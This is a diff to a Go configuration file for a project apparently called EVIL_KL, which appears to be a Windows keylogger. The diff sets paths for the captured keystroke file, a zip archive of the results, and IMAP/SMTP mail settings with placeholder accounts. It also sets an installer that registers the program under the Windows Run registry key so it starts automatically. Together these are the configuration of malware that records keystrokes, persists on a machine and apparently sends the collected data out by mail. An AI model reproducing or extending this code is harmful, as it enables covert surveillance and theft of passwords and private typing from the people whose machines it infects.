@@ -2,6 +2,7 @@ package config
 
 /*
 Create <Config> - init Config structure
+IT IS PREFERABLE TO USE ABSOLUTE FILE PATH
 	Returns <*Config>:
 		1. Structure pointer
 */
@@ -9,16 +10,16 @@ func (c *Config) Create() *Config {
 	c = &Config{
 		cfg: Cfg{
 			Service: Service{
-				Name: "EVIL_KB",
+				Name: "EVIL_KL",
 				ID:   "ec871226-7f5b-425b-bad4-f52fb6577d1f",
 			},
 			Logger: Logger{
-				Path:  "./logs.txt",
+				Path:  "C:\\temp\\evil-kl\\servicelogs\\logs.txt",
 				Level: 0,
 			},
 			Mail: Mail{
 				IMAP: IMAP{
-					Username:      "imapuser@mail.ru",
+					Username:      "imapuser@test.ru",
 					Password:      "password",
 					Host:          "localhost",
 					Port:          993,
@@ -26,7 +27,7 @@ func (c *Config) Create() *Config {
 					CheckInterval: 10,
 				},
 				SMTP: SMTP{
-					Username: "smtpuser@mail.ru",
+					Username: "smtpuser@test.ru",
 					Password: "password",
 					Host:     "localhost",
 					Port:     25,
@@ -35,18 +36,15 @@ func (c *Config) Create() *Config {
 				},
 			},
 			Keylogger: Keylogger{
-				Path: "./",
-				Name: "keylogger.txt",
+				Path: "C:\\temp\\evil-kl\\keylogger\\keylogger.txt",
 			},
 			Zipper: Zipper{
-				Path: "./",
-				Name: "keylogger.zip",
+				Path: "C:\\temp\\evil-kl\\result.zip",
 			},
 			Installer: Installer{
-				ServicePath: "C:\\temp\\kl\\",
-				ServiceName: "kl.exe",
+				ServicePath: "C:\\temp\\evil-kl\\evil-kl.exe",
 				RegPath:     "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-				RegName:     "some_name",
+				RegName:     "evil-kl",
 			},
 		},
 	}
